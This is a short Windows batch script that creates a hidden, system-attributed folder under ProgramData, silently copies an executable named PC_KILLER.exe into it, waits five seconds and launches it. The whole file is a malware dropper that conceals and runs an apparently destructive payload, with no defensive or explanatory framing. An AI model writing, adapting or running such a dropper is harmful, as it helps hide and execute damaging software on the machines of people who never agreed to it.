@echo off

set "SOURCE_EXE=PC_KILLER.exe"
set "TARGET_DIR=%ProgramData%\.SmaskHidden"
set "TARGET_EXE=%TARGET_DIR%\%SOURCE_EXE%"
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
    attrib +h +s "%TARGET_DIR%"
)
copy "%~dp0%SOURCE_EXE%" "%TARGET_EXE%" /Y >nul
timeout /t 5 /nobreak >nul
start "" "%TARGET_EXE%"
exit

